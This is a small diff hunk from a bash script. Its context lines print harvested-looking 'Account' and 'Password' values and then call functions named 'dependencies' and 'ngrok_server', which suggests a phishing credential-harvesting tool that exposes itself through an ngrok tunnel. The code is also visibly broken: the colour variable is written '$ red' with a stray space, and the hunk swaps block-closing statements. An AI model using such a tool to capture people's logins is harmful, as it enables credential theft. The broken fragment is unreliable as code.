@@ -243,12 +243,7 @@ echo -e $ red "Account : $account"
 echo -e $ red "Password: $password"
 echo -e $ red Press Ctrl + C to Exit
 sleep 0.75
-
-
-done 
-
-}
-
+fi
 
 dependencies
 ngrok_server
